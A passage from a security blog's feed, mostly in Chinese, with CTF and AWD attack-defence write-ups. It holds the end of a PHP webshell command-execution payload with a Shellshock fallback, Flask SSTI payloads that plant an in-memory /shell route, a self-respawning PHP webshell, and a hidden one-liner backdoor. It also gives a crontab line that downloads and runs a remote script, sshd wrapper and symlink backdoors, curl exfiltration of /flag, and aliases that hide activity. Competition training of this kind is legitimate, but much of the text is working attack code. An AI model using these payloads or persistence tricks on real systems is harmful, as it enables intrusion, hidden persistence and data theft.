class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>可以看到，参数s接收执行命令的参数    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>所以s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>可以得到压缩密码为P4Uk6qkh6Gvqwg3y。下面就可以解压beacon keys.下面需要做的工作为：获得私钥，通过私钥获得AES密钥以查看与teamserver的通信内容。需要用到的工具在<br><a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a></p><p>首先是根据私钥文件恢复RSA KEY。<img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image">根据RSA KEY 恢复AES KEY，需要看beacon通信的数据包，根据cs特性，一般这个值藏在cookie里。<img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image">拿到AES KEY之后，继续利用脚本还原beacon返回的内容，这里抓取的是submit.php的特征。根据CobaltStrike的通信规则，beacon会向teamserver POST submit.php?id=xxx，POSTDATA为AES加密后的内容。将加密后的内容复制出来之后解密<img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"><br>注意需要是base64格式的，然后使用脚本进行解密<img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image">解密后得到flag。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这题太折磨人了，做了好久才做出来，写wp又写了一段时间。顺便学了下CS的简单通信过程，收获还是有的。<br>参考链接：<a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a><br><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a><br><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包&lt;img src=&quot;http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim&quot; alt=&quot;paste image&quot;&gt;在这里看到了很多ignition</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Analysis of flask memory webshell</title>
    <link href="https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/"/>
    <id>https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/</id>
    <published>2021-09-24T13:16:39.000Z</published>
    <updated>2021-09-24T14:56:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h1><p>Before analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the previous passage I’ve introduced memory webshell in flask and implemented it,so in this passage I’ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell.</p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>This is a EXP in Flask SSTI vulnerability which could register a route and execute system command.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](</span><br><span class="line">&quot;app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">&quot;,</span><br><span class="line">&#123;</span><br><span class="line">&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],</span><br><span class="line">&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>There are some complex functions and variables in the PoC,I’ll explain it.<br>From SSTI we can reach eval function to execute python command,such as eval(“__import__(‘os’).popen(‘whoami’).read()”)<img src="http://cdn.polowong.top/163249208767051gyctei.png?imageslim" alt="paste image"><br>function add_url_rule() is used for adding route,such as add route in flask app.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options)</span><br></pre></td></tr></table></figure><p>Briefly,we can pass parameter to this function to register route and define the handle function.<br>Usually we can pass(‘/shell’,’shell’,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.<br>In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p> This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I  didn’t explain variables like request_ctx_stack 、app、current_app.</p><p> request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop 、handle it.<br>So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask app’s every handle function in route to handle the current request!</p><p>request.args.get() is used for get the parameter’s value from front-end,juset need the parameter name and the default value is whoami in this EXP.</p><p>In eval function, we noticed that there is a variable called app, but now we don’t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack.</p><p>We  have analysed  all the EXP, so we can generate a memory webshell now:)<br><img src="http://cdn.polowong.top/1632494776728fam272p6.png?imageslim" alt="paste image">no new route was found in source code:)<img src="http://cdn.polowong.top/1632495118141e8t9fc9j.png?imageslim" alt="paste image"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p> <a href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a><br> <a href="https://segmentfault.com/blog/myflask">https://segmentfault.com/blog/myflask</a><br> <a href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a><br> <a href="https://englndcib.blogspot.com/2021/08/python-lambda.html">https://englndcib.blogspot.com/2021/08/python-lambda.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NOTICE&quot;&gt;&lt;a href=&quot;#NOTICE&quot; class=&quot;headerlink&quot; title=&quot;NOTICE&quot;&gt;&lt;/a&gt;NOTICE&lt;/h1&gt;&lt;p&gt;Before analysis , I assumed that you know the princple</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>implementation of memory webshell in flask</title>
    <link href="https://polosec.github.io/2021/09/05/webshell-in-flask/"/>
    <id>https://polosec.github.io/2021/09/05/webshell-in-flask/</id>
    <published>2021-09-05T09:30:36.000Z</published>
    <updated>2021-09-15T15:08:03.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Server-side Template Injection(SSTI)  is a common vulnerability in Flask framework.If the application choosed flask framework and exists SSTI vulnerability,actually easy to be exploited .</p><p>It is easy to be exploited if a SSTI vulnerability were found. In this page ,I’ll show how to utilize it to inject webshell into memory.In next passage I’ll explain the procedure of a Flask app receive,understand and execute the command which sent by user.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>A simple Flask framework web application with SSTI vulnerability as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>In this demo , you can enter test directory and pass parameter ‘name’ via GET method,which could execute python command by a specific attack payload which generated by SSTI exploit chains.</p><p>Simple SSTI PoC in this demo(webserver launched on my desktop, default ip is 127.0.0.1, port:5000):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?url&#x3D;&#123;&#123;url_for.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631714973234z6zu44pt.png?imageslim" alt="paste image"><br>This PoC shows that  SSTI vulnerability could execute system command in web page  which based on Flask.But the privilege inherited from the user who launched this application.</p><h1 id="Webshell-injection-in-Flask"><a href="#Webshell-injection-in-Flask" class="headerlink" title="Webshell injection in Flask"></a>Webshell injection in Flask</h1><p>There is a way to inject webshell into flask:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.find the function which responsible for registering route</span><br><span class="line">2.pass paramaters to the function and improt os modules to execute system command</span><br><span class="line">3.expose an API to  execute user-defined system commandso </span><br><span class="line">so here is the Payload</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631718243223q0ni26nb.png?imageslim" alt="paste image"><br>Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami.</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>In this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Server-side Template Injection</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AWD新手的不死马及权限维持思路</title>
    <link href="https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
    <id>https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/</id>
    <published>2021-05-29T02:42:40.000Z</published>
    <updated>2021-05-29T04:08:31.726Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考链接<br><a href="https://jlkl.github.io/2019/02/08/Web_13/">https://jlkl.github.io/2019/02/08/Web_13/</a><br><a href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a><br><a href="https://www.cnblogs.com/Cl0ud/p/13620537.html">https://www.cnblogs.com/Cl0ud/p/13620537.html</a><br><a href="https://zhuanlan.zhihu.com/p/88850561">https://zhuanlan.zhihu.com/p/88850561</a></p></blockquote><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>不死马指的是入到内存的webshell，在PHP中可以使用ulink删除自身文件并循环创建webshell。</p><h1 id="不死马利用流程"><a href="#不死马利用流程" class="headerlink" title="不死马利用流程"></a>不死马利用流程</h1><p>首先根据web后门或者任何挖掘出来的漏洞尝试执行系统命令（如遗留的web后门等），通过该类漏洞成功执行写入不死马的系统命令并执行该不死马。比如通过内置的后门直接system(“echo 不死马脚本内容 &gt;/var/www/html;php 不死马文件名.php”)。这样就会在该目录下不断生成一个不死马 比如.3.php。通过webshell管理工具或者使用Python写脚本批量访问去getflag。</p><h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>这里偷个别的师傅的图先<br><img src="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim" alt="paste image">不死马一般长这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);&#x2F;&#x2F;设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file &#x3D; &#39;.3.php&#39;;</span><br><span class="line">    $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;</span><br><span class="line">    &#x2F;&#x2F;pass&#x3D;pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);</span><br><span class="line">        usleep(0);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该不死马不断生成.3.php，通过访问<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a>  然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。这里使用MD5是因为防止别人骑着自己的马进去了，MD5理论上不可逆。如果使用python批量getshell的话大体思路就是</p><p>url=<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a><br>data={“a”:”system(&quot;cat /flag&quot;);”}<br>flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。</p><h1 id="不死马删除"><a href="#不死马删除" class="headerlink" title="不死马删除"></a>不死马删除</h1><p>这里不死马删除有几个思路<br>1.shell脚本直接删除不死马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">rm -rf .3.php;</span><br><span class="line">echo &quot;remove success&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>这里其实可以更完善一些，比如挂上while自动检测新增的文件 或者配合文件监控脚本实现新增之后直接调用函数删除新增的文件等等（Python实现，我不会shell）<br>2.PHP服务重启（awd环境可能不允许，因为权限较低）<br>service apache2 restart<br>service php restart</p><p>3.杀低权限PHP进程<br>php-apache:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br></pre></td></tr></table></figure><p>php-fpm:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="awd权限维持"><a href="#awd权限维持" class="headerlink" title="awd权限维持"></a>awd权限维持</h1><p>AWD的权限维持其实和普通的权限维持差不多常用的大概有 crontab ssh软连接 sshwrapper。<br>详情参考<a href="https://xz.aliyun.com/t/7338%E7%BB%86%E7%9C%8B%E4%BA%86%E4%B8%8B%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0">https://xz.aliyun.com/t/7338细看了下这篇文章</a> 发现了一个隐藏一句话的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?&#x3D;\&#96;\$_POST[cmd]\&#96;?&gt;\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php</span><br></pre></td></tr></table></figure><p>crontab添加计划任务自动写不死马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure><p>本地起一个http服务 放上一个sh.sh脚本，里面写了创建php不死马的命令。<br>下面两种暂时利用失败 可能是腾讯云的原因。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh wrapper</span><br><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">exp:</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line">ssh软连接</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;</span><br><span class="line">建立一个软连接，然后通过5555端口访问ssh服务</span><br></pre></td></tr></table></figure><p>还有一种操作就是curl外带本地命令执行结果,这个也可以写到crontab里面，比较方便的使用提交flag的api提交flag。示例如下</p><p>curl “http://:7777?flag=$(cat /flag)”</p><h1 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h1><p>用来迷惑对手</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;</span><br><span class="line">alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考链接&lt;br&gt;&lt;a href=&quot;https://jlkl.github.io/2019/02/08/Web_13/&quot;&gt;https://jlkl.github.io/2019/02/08/Web_13/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>安网杯部分wp</title>
    <link href="https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/"/>
    <id>https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/</id>
    <published>2021-05-12T09:57:42.000Z</published>
    <updated>2021-05-14T15:54:34.000Z</updated>
    
